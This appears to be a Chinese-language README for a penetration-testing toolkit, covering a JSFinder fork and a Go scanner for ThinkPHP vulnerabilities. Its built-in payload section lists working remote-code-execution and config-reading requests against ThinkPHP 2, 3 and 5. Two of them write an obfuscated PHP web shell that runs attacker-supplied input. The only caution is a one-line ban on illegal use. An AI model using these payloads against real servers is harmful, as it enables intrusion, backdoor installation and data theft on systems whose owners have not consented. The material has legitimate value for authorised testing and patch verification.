# Tools

> 这是Tptfb11的渗透测试工具库，包含自己开发的常用工具以及一些对市面上已有工具的更改，使他们更加方便我们使用，喜欢的话请点击右上角的start

# JSFinder

​	JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。

​	原作者：[Threezh1/JSFinder:](https://github.com/Threezh1/JSFinder)

​	我的更改是在原有的基础之上，使用了多线程爬取和解析网站的js接口。并且新增了-html参数可以导出html可视化报告，思路参考了：https://harvey.plus/2021/01/21/%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-JSFinder%E5%AE%9E%E7%94%A8%E6%94%B9%E9%80%A0/

# Go-ThinkPHP-Tool

​	Go-Thinkphp-Tool是本人使用go语言编写的一款针对thinkPHP漏洞探测的一个自动化工具。

## 使用方式

```powershell
PS > & '.\ThinkPHP Tool.exe' -help

  _______ _     _       _    _____  _    _ _____    _______          _
 |__   __| |   (_)     | |  |  __ \| |  | |  __ \  |__   __|        | |
    | |  | |__  _ _ __ | | _| |__) | |__| | |__) |    | | ___   ___ | |
    | |  | '_ \| | '_ \| |/ /  ___/|  __  |  ___/     | |/ _ \ / _ \| |
    | |  | | | | | | | |   <| |    | |  | | |         | | (_) | (_) | |
    |_|  |_| |_|_|_| |_|_|\_\_|    |_|  |_|_|         |_|\___/ \___/|_|

                                                                                                                       --By Tptfb11
Usage of C:\Users\Tptfb11\Desktop\ThinkPHP\ThinkPHP Tool.exe:
  -f string
        [-] -f input file
  -m string
        [-] choose module: 默认全部检测！
        '-m tp2' 检测thinkPHP2 rce
        '-m tp3' 检测thinkPHP3 log_rce
        '-m tp5' 检测thinkPHP5 sql+rce
  -url string
        [-] plase input a url
```

## 内置payload

```go
thinkphp2
	rce
		/index.php/module/action/param1/${@(whoami)}
thinkphp3
	log-rce
		/?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/22_01_01.log
		.......
thinkphp5
	rce
		_method=__construct&method=GET&filter[]=assert&get[]=phpinfo()
		/?s=index/think\app/invokefunction&function=phpinfo&vars[0]=100
		/?s=index/\think\Container/invokefunction/invokefunction&function=phpinfo&vars[0]=100
		/?s=index/\think\Request/input&filter=var_dump&data=hack
		/?s=index/\think\view\driver\Php/display&content=%3C?php%20var_dump(md5(hack));?%3E
		/?s=index/\think\template\driver\file/write&cacheFile=mqz.php&content=%3C?php%20var_dump(md5(hack));?%3E
		/?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=12345.php&vars%5B1%5D%5B1%5D=%3C?php%20echo%20'vul';%20$poc%20=%22axsxsxexrxt%22;$poc_1%20=%20explode(%22x%22,%20$poc);$poc_2%20=%20$poc_1%5B0%5D%20.%20$poc_1%5B1%5D%20.%20$poc_1%5B2%5D%20.%20$poc_1%5B3%5D.%20$poc_1%5B4%5D.%20$poc_1%5B5%5D;$poc_2(urldecode(urldecode(urldecode($_REQUEST%5B'12345'%5D))));?%3E
		/?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=12345.php&vars%5B1%5D%5B1%5D=%3C?php%20echo%20'vul';%20$fun%20=%20create_function('',urldecode(urldecode(urldecode($_REQUEST%5Bwww%5D))));$fun();?%3E
	sql
		/?s=index/think\config/get&name=database.username
```

## 说明

​	禁止非法使用！！
